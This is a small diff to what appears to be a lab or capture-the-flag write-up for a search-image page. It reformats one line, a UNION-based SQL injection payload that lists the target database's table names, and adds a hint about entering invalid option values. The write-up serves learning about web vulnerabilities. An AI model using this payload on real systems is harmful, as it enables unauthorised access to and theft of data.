@@ -2,7 +2,7 @@
     /?page=searchimg
 # How:
 -By entering
-     1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()<br>
+> 1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()<br>
 
 -Change the value of 1 of the options to an invalid value.
 Or
